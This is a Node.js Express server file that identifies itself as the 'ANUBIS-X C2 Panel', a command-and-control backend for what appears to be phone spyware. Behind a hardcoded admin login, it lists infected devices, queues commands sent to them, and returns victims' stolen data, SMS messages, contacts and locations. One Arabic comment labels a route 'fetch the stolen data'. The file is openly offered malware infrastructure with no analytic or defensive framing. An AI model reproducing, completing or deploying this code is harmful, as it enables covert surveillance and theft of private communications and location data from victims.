const express = require('express');
const mysql = require('mysql2');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== الإعدادات =====
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(session({
    secret: 'anubis-secret-key-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// ===== قاعدة البيانات =====
const db = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'anubis',
    password: process.env.DB_PASSWORD || 'password',
    database: process.env.DB_NAME || 'anubis_db',
    waitForConnections: true,
    connectionLimit: 10
});

// ===== الصفحة الرئيسية =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== لوحة التحكم =====
app.get('/dashboard', (req, res) => {
    if (!req.session.logged_in) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// ===== API: تسجيل الدخول =====
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === 'admin' && password === 'anubis2024') {
        req.session.logged_in = true;
        res.json({ success: true });
    } else {
        res.json({ success: false, message: 'Invalid credentials' });
    }
});

// ===== API: تسجيل الخروج =====
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ===== API: جلب الأجهزة =====
app.get('/api/devices', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.query('SELECT * FROM devices ORDER BY last_seen DESC', (err, results) => {
        if (err) {
            return res.json({ error: err.message });
        }
        
        const devices = results.map(device => ({
            ...device,
            online: (Date.now() - new Date(device.last_seen).getTime()) < 60000
        }));
        
        res.json({ devices });
    });
});

// ===== API: إرسال أمر =====
app.post('/api/commands', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { device_id, command } = req.body;
    
    db.query(
        'INSERT INTO commands (device_id, command, status) VALUES (?, ?, ?)',
        [device_id, command, 'pending'],
        (err, result) => {
            if (err) {
                return res.json({ error: err.message });
            }
            res.json({ success: true, command_id: result.insertId });
        }
    );
});

// ===== API: جلب البيانات المسروقة =====
app.get('/api/data', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.query(
        'SELECT data_content FROM captured_data ORDER BY timestamp DESC LIMIT 100',
        (err, results) => {
            if (err) {
                return res.json({ error: err.message });
            }
            res.json({ logs: results.map(r => r.data_content) });
        }
    );
});

// ===== API: جلب الرسائل =====
app.get('/api/sms', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.query(
        'SELECT * FROM sms_messages ORDER BY timestamp DESC LIMIT 100',
        (err, results) => {
            if (err) {
                return res.json({ error: err.message });
            }
            res.json({ messages: results });
        }
    );
});

// ===== API: جلب جهات الاتصال =====
app.get('/api/contacts', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.query(
        'SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 100',
        (err, results) => {
            if (err) {
                return res.json({ error: err.message });
            }
            res.json({ contacts: results });
        }
    );
});

// ===== API: جلب المواقع =====
app.get('/api/locations', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    db.query(
        'SELECT * FROM locations ORDER BY timestamp DESC LIMIT 100',
        (err, results) => {
            if (err) {
                return res.json({ error: err.message });
            }
            res.json({ locations: results });
        }
    );
});

// ===== API: حفظ الإعدادات =====
app.post('/api/settings', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const settings = req.body;
    let success = true;
    
    Object.keys(settings).forEach(key => {
        db.query(
            'INSERT INTO settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = ?',
            [key, settings[key], settings[key]],
            (err) => {
                if (err) success = false;
            }
        );
    });
    
    res.json({ success });
});

// ===== API: الإحصائيات =====
app.get('/api/stats', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const stats = {
        devices: 0,
        commands: 0,
        data: 0
    };
    
    db.query('SELECT COUNT(*) as count FROM devices', (err, result) => {
        if (!err) stats.devices = result[0].count;
        
        db.query('SELECT COUNT(*) as count FROM commands WHERE status = "pending"', (err, result) => {
            if (!err) stats.commands = result[0].count;
            
            db.query('SELECT COUNT(*) as count FROM captured_data', (err, result) => {
                if (!err) stats.data = result[0].count;
                res.json(stats);
            });
        });
    });
});

// ===== تشغيل السيرفر =====
app.listen(PORT, () => {
    console.log(`⚡ ANUBIS-X C2 Panel running on port ${PORT}`);
});
